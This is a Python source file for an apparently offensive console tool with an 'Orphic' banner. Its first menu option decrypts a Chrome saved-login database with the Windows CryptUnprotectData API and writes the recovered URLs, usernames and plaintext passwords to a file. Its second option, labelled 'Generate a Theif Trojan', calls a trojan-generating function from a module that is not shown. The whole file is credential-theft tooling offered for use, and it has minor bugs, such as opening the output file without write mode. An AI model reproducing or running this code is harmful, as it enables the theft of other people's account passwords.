from tqdm import tqdm
import win32crypt
import sqlite3
from core.gen import *
from core.misc import *

def main():

    def decryptFile(file):
        conn = sqlite3.connect(file) 
        cursor = conn.cursor()
        cursor.execute('Select action_url, username_value, password_value FROM logins')
        passfile = open(file+"_decrypt.txt")
        passfile.write("\nChrome Saved Passwords..\n")
        for result in tqdm(cursor.fetchall(), "DECRYPTION"):
            password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
            if password:
                passfile.write('\n[URL]: '+result[0])
                passfile.write('\n[USERNAME]: '+result[1])
                passfile.write('\n[PASSWORD]: ' + str(password))

    def Console():
        clear()
        banner = r"""
             ██████╗ ██████╗ ██████╗ ██╗  ██╗██╗ ██████╗
            ██╔═══██╗██╔ ═██╗██╔══██╗██║  ██║██║██╔════╝
            ██║   ██║██████╔╝██████╔╝███████║██║██║   
            ██║   ██║██╔══██╗██╔═══  ██╔══██║██║██║  
            ╚██████╔╝██║  ██║██║     ██║  ██║██║╚██████╗
             ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝ ╚═════╝
             | ---------------- META ------------------- |
             """

        opshell = Style.BRIGHT + Fore.LIGHTBLUE_EX + "[1] Decrypt a Login File..\n[2] Generate a Theif Trojan..\n==>" + Style.RESET_ALL
        print(banner)
        main = input(opshell)
        if(main == "1"):
            filename = input(tag_blue + " Enter Filename : ")
            try:
                lfile = open(filename, "r+")
                decryptFile(filename)
                lfile.close()
                input("")
            except FileNotFoundError:
                print(tag_red+" File not Found!")
                input()
        elif(main == "2"):
            trojan = input("[+] Enter Filename : ")
            generate_file(trojan)
            input("==> press enter..")
        else:
            print(tag_red + " Unidentified input!?")
    while(True):
        try:
            Console()
        except KeyboardInterrupt:
            exit(1)


if __name__ == "__main__":
    main()